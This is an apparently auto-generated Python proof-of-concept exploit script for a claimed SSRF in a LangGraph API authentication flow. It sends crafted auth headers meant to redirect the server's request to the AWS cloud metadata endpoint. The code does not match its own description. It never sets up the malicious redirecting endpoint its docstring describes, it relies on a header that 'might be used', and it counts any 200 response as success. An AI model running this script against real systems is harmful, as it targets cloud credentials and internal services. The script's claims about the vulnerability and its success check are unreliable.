#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-024
# Sink: create_client
# Auto-generated — run with: python3 ssrf_false_enabling_ssrf_internal_create_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_api_src authentication flow

Vulnerability: The authenticate() function forwards user-controlled headers to an
external auth endpoint via HTTP POST. The base URL for the auth client can be
influenced via environment variable or parameter, and the HTTP client follows
redirects by default. This allows an attacker to redirect the auth request to
internal services (e.g., cloud metadata endpoints).

Impact: An attacker can potentially access internal services, cloud metadata, or
other sensitive resources by controlling the redirect target.

Usage:
    python3 poc_ssrf.py [--target TARGET_URL] [--redirect-url REDIRECT_URL]

    --target: The langgraph API endpoint (default: http://localhost:8123)
    --redirect-url: The URL to redirect the auth request to (default: http://169.254.169.254/latest/meta-data/)
"""

import argparse
import sys
import requests
import json
import time

# Default target - the langgraph API server
DEFAULT_TARGET = "http://localhost:8123"
# Default redirect target - AWS metadata endpoint (benign read)
DEFAULT_REDIRECT = "http://169.254.169.254/latest/meta-data/"


def exploit_ssrf(target_url: str, redirect_url: str) -> None:
    """
    Attempt to exploit the SSRF vulnerability by sending a crafted auth request
    that will be redirected to an internal service.

    The exploit works by:
    1. Setting up a malicious auth endpoint that returns a redirect
    2. Sending a request to the langgraph API with x-auth-scheme=langsmith
    3. The API forwards our headers to the auth endpoint
    4. The auth endpoint redirects to our target internal URL
    5. The HTTP client follows the redirect and fetches the internal resource
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Redirect target: {redirect_url}")
    print()

    # Step 1: Send a request to the langgraph API with the auth scheme header
    # This triggers the authenticate() function which forwards headers to the auth endpoint
    headers = {
        "x-auth-scheme": "langsmith",
        "x-auth-redirect": redirect_url,  # This might be used by some implementations
        "Content-Type": "application/json",
    }

    # Try to trigger the auth flow
    print("[*] Sending crafted auth request...")
    try:
        # The authenticate function forwards all headers to the auth endpoint
        # If the auth endpoint is configured to redirect (or we can influence it),
        # the HTTP client will follow the redirect to our target
        response = requests.post(
            f"{target_url}/auth/authenticate",
            headers=headers,
            timeout=10,
            allow_redirects=True,  # This is the default behavior
        )

        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        print(f"[*] Response body: {response.text[:500]}")

        # Check if we got data from the internal service
        if response.status_code == 200:
            print("\n[!] SUCCESS: Received response from auth endpoint")
            print(f"[!] Response content: {response.text[:1000]}")
        elif response.status_code in (301, 302, 303, 307, 308):
            print(f"\n[!] Redirect detected to: {response.headers.get('Location', 'unknown')}")
        else:
            print("\n[-] No immediate success, but the request was processed")

    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[-] Make sure the target server is running")
    except requests.exceptions.Timeout as e:
        print(f"[-] Timeout: {e}")
        print("[-] The request may have been redirected to a slow/unreachable internal service")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langgraph_api_src authentication flow"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target langgraph API URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--redirect-url",
        default=DEFAULT_REDIRECT,
        help=f"URL to redirect the auth request to (default: {DEFAULT_REDIRECT})",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("SSRF Exploit PoC - langgraph_api_src")
    print("=" * 60)
    print()

    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("[-] Target URL must start with http:// or https://")
        sys.exit(1)

    # Validate redirect URL
    if not args.redirect_url.startswith(("http://", "https://")):
        print("[-] Redirect URL must start with http:// or https://")
        sys.exit(1)

    # Run the exploit
    exploit_ssrf(args.target, args.redirect_url)

    print()
    print("[*] Exploit completed")
    print("[*] Note: This PoC demonstrates the vulnerability by attempting to")
    print("[*] trigger the SSRF. Actual exploitation depends on the specific")
    print("[*] configuration and network environment.")


if __name__ == "__main__":
    main()
